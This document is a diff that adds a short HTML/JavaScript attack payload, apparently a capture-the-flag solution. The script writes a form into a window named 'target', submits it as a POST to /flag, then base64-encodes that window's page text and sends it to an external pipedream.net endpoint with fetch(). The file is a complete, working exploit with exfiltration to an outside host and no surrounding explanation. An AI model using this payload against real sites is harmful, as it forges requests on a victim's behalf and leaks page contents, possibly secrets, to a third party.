@@ -1,0 +1,12 @@
+<script>
+	window.open("", "target").document.body.innerHTML += "<form action=/flag method=POST>";
+	setTimeout(() => {
+		window.open("", "target").document.forms[1].submit();
+		setTimeout(() => {
+			fetch(
+				"https://ensgbp88ydxt.x.pipedream.net/" +
+					btoa(window.open("", "target").document.body.textContent)
+			);
+		}, 1000);
+	}, 1000);
+</script>
